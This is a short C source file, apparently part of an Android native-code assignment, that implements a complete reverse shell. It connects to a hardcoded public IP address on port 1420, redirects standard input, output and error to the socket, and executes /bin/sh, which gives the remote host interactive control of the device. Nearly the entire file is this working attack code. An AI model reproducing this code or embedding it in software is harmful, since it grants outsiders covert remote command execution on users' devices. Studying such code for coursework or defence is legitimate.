#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include "com_bdg_double07_reversecshell_instrumentation_reverseshell_NativeReverseShell.h"

void reverse_shell(char* ip) {
  /* Allocate a socket for IPv4/TCP (1) */
  int sock = socket(AF_INET, SOCK_STREAM, 0);
  /* Setup the connection structure. (2) */
  struct sockaddr_in sin;
  sin.sin_family = AF_INET;
  sin.sin_port = htons(1420);
  /* Parse the IP address (3) */
  inet_pton(AF_INET, ip, &sin.sin_addr.s_addr);
  /* Connect to the remote host (4) */
  connect(sock, (struct sockaddr *)&sin, sizeof(struct sockaddr_in));

  /* Duplicate the socket to STDIO (5) */
  dup2(sock, STDIN_FILENO);
  dup2(sock, STDOUT_FILENO);
  dup2(sock, STDERR_FILENO);

  /* Setup and execute a shell. (6) */
  char *argv[] = {"/bin/sh", NULL};
  execve("/bin/sh", argv, NULL);
}

int main(int argc, char *argv[]){
  char ip [15] = "54.86.191.114"; //ip address of assignment
  reverse_shell(ip);
}
